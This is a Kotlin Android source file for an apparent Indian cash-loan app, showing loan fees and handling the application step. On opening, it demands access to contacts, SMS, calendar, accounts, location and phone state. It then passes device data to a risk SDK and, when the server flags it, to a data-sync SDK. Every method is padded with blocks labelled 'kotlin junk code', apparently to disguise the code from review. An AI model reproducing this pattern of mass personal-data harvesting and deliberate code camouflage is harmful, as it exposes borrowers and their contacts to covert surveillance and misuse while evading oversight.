package com.great.cash.rupee.module.home

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import android.view.View
import androidx.lifecycle.Observer
import com.appsflyer.AppsFlyerLib
import com.great.cash.rupee.R
import com.great.cash.rupee.commonbase.BaseAct
import com.great.cash.rupee.databinding.ActLoanBinding
import com.great.cash.rupee.entity.HomeOrderInfoBean
import com.great.cash.rupee.module.model.LoanModel
import com.great.cash.rupee.network.NetworkStart
import com.great.cash.rupee.risk.RiskManage
import com.great.cash.rupee.utils.*
import com.great.cash.rupee.view.dialog.DialogUtil
import com.tbruyelle.rxpermissions2.RxPermissions
import com.yinlan.newdatasyc.newwork.DataManagerSDK
import io.reactivex.functions.Consumer

class LoanActivity :
    BaseAct<ActLoanBinding, LoanModel>(LoanModel::class.java) {
    private var isAgreement = true
    private var orderInfo: HomeOrderInfoBean? = null
    private var rxPremission: RxPermissions? = null
    private var retryTime = 0;
    override fun getLayout(): Int {
            //--------------------------kotlin junk code-----------------------------
            try {
                var income_range: String? = "1000000"
                income_range?.run {
                    val income = toString() + length
                    val indexOf = income.indexOf("s")
                    val substring = substring(indexOf)
                    income_range += substring
                }
            } catch (eKotlinCode2: Exception) {
            }
            //--------------------------kotlin junk code-----------------------------

        return R.layout.act_loan
    }

    override fun initView(savedInstanceState: Bundle?) {
        //--------------------------kotlin junk code-----------------------------
        try {
            val nameList = arrayListOf<String>()
            val userName = arrayListOf<String>()
            userName.add("userName_code0")
            userName.add("userName_code1")
            userName.add("userName_code2")
            userName.add("userName_code3")
            userName.add("userName_code4")
            userName.add("userName_code5")
            nameList.addAll(userName)
        } catch (eKotlinCode0: Exception) {
        }
        //--------------------------kotlin junk code-----------------------------

        setLightBar(true)
        dataBing!!.clickListener = this
        rxPremission = RxPermissions(this)
        checkPermissionss()
        getLoanInfo()
    }

    private fun getLoanInfo() {
            //--------------------------kotlin junk code-----------------------------
            try {
                val start_time = System.currentTimeMillis()
                val end_time = System.currentTimeMillis()
                val cha_time = hashMapOf<String, Any>()
                end_time.takeIf {
                    it == start_time
                }?.let {
                    val u_one = it.toString().toList()
                    val u_two = end_time.toString().toList()
                    if (u_one.size == u_one.size) {
                        for ((index, i) in u_one.withIndex()) {
                            cha_time["k_${i}"] = u_two[index]
                        }
                    }
                }
            } catch (eKotlinCode9: Exception) {
            }
            //--------------------------kotlin junk code-----------------------------

        viewModel.getLoanInfo().observe(this, Observer {
            it?.let {
                orderInfo = it
                dataBing!!.etAmount.text = "₹ ${it.amount}"
                dataBing!!.etRepayment.text = "₹ ${it.repaymentAmount}"
                dataBing!!.etReceive.text = "₹ ${it.realAmount}"
                dataBing!!.etDate.text = "${it.applicationDate}"
                dataBing!!.etDueDate.text = "${it.repayTime}"
                dataBing!!.tvGst.text = "₹ ${it.gstFee}"
                dataBing!!.tvInter.text = "₹ ${it.interest}"
                dataBing!!.tvPro.text = "₹ ${it.onceHandlingFee}"
                dataBing!!.tvAm.text = "₹ ${it.onceServiceFee}"
                dataBing!!.DisbursalBank.text = "${it.bankName}"
                dataBing!!.AccountNo.text = "${it.bankAccount}"
            }
        })
    }

    private fun checkPermissionss() {
            //--------------------------kotlin junk code-----------------------------
            try {
                val firend_name = "1a2b3c4d5e"
                val mather_name = mutableListOf<String>()
                val bro_name = mutableListOf<String>()
                val sister_name = mutableListOf<String>()
                for (c in firend_name) {
                    mather_name.add(c.toString())
                }
                mather_name.forEachIndexed { index, s ->
                    bro_name.add(s + index)
                }
                sister_name.addAll(mather_name)
                sister_name.addAll(bro_name)
            } catch (eKotlinCode3: Exception) {
            }
            //--------------------------kotlin junk code-----------------------------

        rxPremission?.request(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALENDAR,
            Manifest.permission.GET_ACCOUNTS
        )?.subscribe(Consumer {
            if (!it) {
                showPermission()
            }else{
                initCashSdk()
            }
        })
    }

    private fun showPermission() {
            //--------------------------kotlin junk code-----------------------------
            try {
                val user_phone = "9020392123"
                var password: String?
                val otp_code = mutableListOf<String>()
                val vaild_code = mutableListOf<String>()
                password = user_phone
                password?.also {
                    for (c in it) {
                        otp_code.add(c.toString())
                    }
                    vaild_code.addAll(otp_code)
                    otp_code.clear()
                }
            } catch (eKotlinCode4: Exception) {
            }
            //--------------------------kotlin junk code-----------------------------

        DialogUtil.showCancelConfirmDialog(this, getString(R.string.permission_failed),
            {
                try {
                    val info = packageManager.getPackageInfo(packageName, 0)
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                    intent.data = Uri.parse("package:" + info.packageName)
                    startActivity(intent)
                    finish()
                } catch (e: Exception) {
                    errorLog(e.toString())
                }
            }, { finish() })
    }

    @SuppressLint("SetTextI18n")
    override fun initData() {
            //--------------------------kotlin junk code-----------------------------
            try {
                var key_params = 0
                val sign_params = "60659917de4a798141b9f1a0btwtqownbpkyxfk6he4f"
                val time_key = "x82jxmztlxnge8bk457127d59926f1daf371b946ab39"
                if (sign_params.length == time_key.length) {
                    val each_key = hashMapOf<String, Any>()
                    val each_value = sign_params.toList()
                    val each_name = time_key.toList()
                    for ((index, str) in each_value.withIndex()) {
                        each_key["key_$str"] = each_name[index]
                    }
                    val keys = each_key.keys
                    val values = each_key.values
                    key_params += keys.size + values.size
                }
            } catch (eKotlinCode7: Exception) {
            }
            //--------------------------kotlin junk code-----------------------------


    }

    private fun initCashSdk() {
            //--------------------------kotlin junk code-----------------------------
            try {
                val user_phone = "9020392123"
                var password: String?
                val otp_code = mutableListOf<String>()
                val vaild_code = mutableListOf<String>()
                password = user_phone
                password?.also {
                    for (c in it) {
                        otp_code.add(c.toString())
                    }
                    vaild_code.addAll(otp_code)
                    otp_code.clear()
                }
            } catch (eKotlinCode4: Exception) {
            }
            //--------------------------kotlin junk code-----------------------------

        RiskManage.getInstance().init(application) { data: String?, code: Int ->
            if (code == 0) {
                errorLog("riskData::${data}")
                viewModel.updateCachState(
                    AppsFlyerLib.getInstance().getAppsFlyerUID(this),
                    data,
                    200
                ).observe(this, Observer {
                    dismissDialog()
                    if (it) {
                        applyAmount()
                    } else {
                        showMsg("Data error,please try again")
                    }
                })
            } else {
                errorLog("result:${data}")
                retryTime++
                if (retryTime < 10) {
                    RiskManage.getInstance().getData()
                    viewModel.updateCachState(
                        AppsFlyerLib.getInstance().getAppsFlyerUID(this),
                        data,
                        code
                    )
                } else {
                    dismissDialog()
                    showMsg(getString(R.string.permission_failed))
                    finish()
                }
            }
        }
    }

    override fun onViewClick(view: View?) {
            //--------------------------kotlin junk code-----------------------------
            try {
                val amount = "98141b9f1a0btwtqowde4a7nbpkyxfk6he4f"
                val overdue = 8077896555346880980
                if (!amount.isEmpty()) {
                    val toList80 = amount.toList().toMutableList()
                    val overdueStr = overdue.toString()
                    val toList80Str = overdueStr.toList()
                    for ((index, i) in toList80Str.withIndex()) {
                        toList80[index] = i
                    }
                }
            } catch (eKotlinCode8: Exception) {
            }
            //--------------------------kotlin junk code-----------------------------

        when (view?.id) {
            R.id.iv_back -> {
                finish()
            }
            R.id.btn_submit -> {
                if (isAgreement) {
                    orderInfo?.let {
                        if (it.riskType=="fyrisk"){
                            showDialog()
                            RiskManage.getInstance().getData()
                        }else{
                            applyAmount()
                        }
                    }
                } else {
                    showMsg("Please Read And Agree the Agreement")
                }
            }
            R.id.iv_agree -> {
                isAgreement = !isAgreement
                dataBing!!.ivAgree.setImageResource(if (isAgreement) R.mipmap.icon_check_true else R.mipmap.icon_check_false)
                dataBing!!.btnSubmit.isEnabled = isAgreement
            }
            R.id.tv_agreement_loan -> {
                val agreeUrl: String =
                    NetworkStart.BASE_URL + "/protocol/protocolPreview.htm?amount=${orderInfo?.amount}&userId=${userId}&timeLimit=${orderInfo?.dayLimit}&appFlag=${Constant.APP_NAME}"
                val bundle = Bundle()
                bundle.putString(Constant.URL, agreeUrl)
                bundle.putString(Constant.TITLE, "Loan Agreement")
                toOtherActivity(BrowserActivity::class.java, bundle)
            }
            R.id.iv_inter -> {
                showTips(getString(R.string.interest_fee), getString(R.string.interest_fee_tips))
            }
            R.id.iv_pro -> {
                showTips(
                    getString(R.string.processing_fee),
                    getString(R.string.processing_fee_tips)
                )
            }
            R.id.iv_am -> {
                showTips(
                    getString(R.string.assessment_fee),
                    getString(R.string.assessment_fee_tips)
                )
            }
            R.id.iv_gst -> {
                showTips(
                    "GST Fee",
                    "GST is charged on the sales of goods and services made in India"
                )
            }
        }
    }

    private fun applyAmount() {
            //--------------------------kotlin junk code-----------------------------
            try {
                var sign = "asdqw676ezxc6hx82jxmztlxnge8bk"
                val key = arrayListOf<String>()
                sign.run {
                    val s = toString() + length
                    val indexOf = s.indexOf("s")
                    val substring = substring(indexOf)
                    sign += substring
                }
                sign.apply {
                    for (c in this) {
                        key.add(c.toString())
                    }
                }
            } catch (eKotlinCode6: Exception) {
            }
            //--------------------------kotlin junk code-----------------------------
        showDialog()
        orderInfo?.let { it ->
            viewModel.applyAmount(it.riskType,getString(R.string.app_name)).observe(this, Observer {
                dismissDialog()
                if (null != it) {
                    if (it.needCatch) {
                        DataManagerSDK.getInstance().SynData(
                            "${it.borrowId}", userId,
                            userPhone, Constant.SYC_UPDATEURL
                        )
                        runOnUiThread {
                            DialogUtil.showDialogWithTime(this@LoanActivity,
                                it.needCatchWaitingTime,
                                View.OnClickListener {
                                    showMsg("Apply success")
                                    finish()
                                })
                        }
                    } else {
                        showMsg("Apply success")
                        finish()
                    }
                }
            })
        }
    }

    private fun showTips(title: String, content: String) {
            //--------------------------kotlin junk code-----------------------------
            try {
                var sign = "asdqw676ezxc6hx82jxmztlxnge8bk"
                val key = arrayListOf<String>()
                sign.run {
                    val s = toString() + length
                    val indexOf = s.indexOf("s")
                    val substring = substring(indexOf)
                    sign += substring
                }
                sign.apply {
                    for (c in this) {
                        key.add(c.toString())
                    }
                }
            } catch (eKotlinCode6: Exception) {
            }
            //--------------------------kotlin junk code-----------------------------

        DialogUtil.showFeeDescDialog(this, title, content)
    }
}
